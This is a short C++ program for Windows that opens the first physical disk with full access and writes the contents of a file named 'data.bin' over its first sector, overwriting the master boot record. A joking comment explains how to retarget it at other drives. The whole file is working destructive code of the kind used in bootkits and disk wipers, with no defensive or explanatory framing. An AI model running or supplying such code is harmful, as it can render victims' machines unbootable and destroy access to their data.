#include <windows.h>
#include <conio.h>
#include <stdio.h>
//To overwrite the boot sector on the hdd,you replace 
// \\\\.\\I: in the c++ code,with \\\\.\\PhysicalDriveX where X is numerical,and is 0 if you have one hdd,or 1,2,etc if you have more than one =)) LOL
 
void main(){
    DWORD dw;
    char *pathToBin = "data.bin";
    HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive != INVALID_HANDLE_VALUE){
        HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (binary != INVALID_HANDLE_VALUE){
            DWORD size = GetFileSize(binary, 0);
            if (size > 0){
                byte *mbr = new byte[size];
                if (ReadFile(binary, mbr, size, &dw, 0)){
                    printf("Binary file successfuly read!\n");
                    //ok,now lets write the contents of the binary file,to the first sector of the drive
                    if (WriteFile(drive, mbr, size, &dw, 0)){
                        printf("First sector overritten successfuly!\n");
                    }
                    else
                        printf("Fatal error! Can't override 1st sector!\n");
                }
                else
                    printf("Error reading from binary file!\n");
            }
            else
                printf("Invalid binary file!\n");
        }
        else{
            printf("Can't find the binary file to read from!\n");
        }
        CloseHandle(binary);
    }
    else
        printf("Administrator privileges required!\n");
    CloseHandle(drive);
    _getch();
}